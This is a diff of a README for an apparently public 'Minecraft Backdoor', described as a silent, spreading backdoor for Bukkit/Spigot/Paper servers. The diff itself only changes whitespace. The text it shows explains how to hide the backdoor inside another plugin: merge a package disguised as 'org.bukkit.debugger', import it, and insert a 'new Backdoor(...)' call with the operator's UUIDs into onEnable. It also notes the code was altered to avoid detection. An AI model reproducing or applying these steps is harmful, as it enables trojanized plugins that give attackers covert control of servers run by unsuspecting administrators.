@@ -1,5 +1,3 @@
-
-
 # Thicc Industries' Minecraft Backdoor - REMSATERED
 
 A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
@@ -35,13 +33,13 @@ I changed parts of this sofware because it was easy to detect you could look for
 
 * Download source code for desired plugin, and open in editor of your choice.
 * Merge ``org.bukkit.debugger`` folder into the plugin's source.
-* Open the Plugin's main source file, The file's class definition should look like this: 
-``public class Something extends JavaPlugin{}``
+* Open the Plugin's main source file, The file's class definition should look like this:
+  ``public class Something extends JavaPlugin{}``
 * Add the following line to the top of the file:
-``import org.bukkit.debugger``
+  ``import org.bukkit.debugger``
 * Find the ``@Override public void onEnable(){}`` method.
 * Add the following line to the beginning of the method:
-``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
+  ``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
 > Note: Add multiple UUIDs by separating multiple "[uuid]" entries by commas.
 * Change other configuration options in Config.java as desired.
 * Compile plugin.
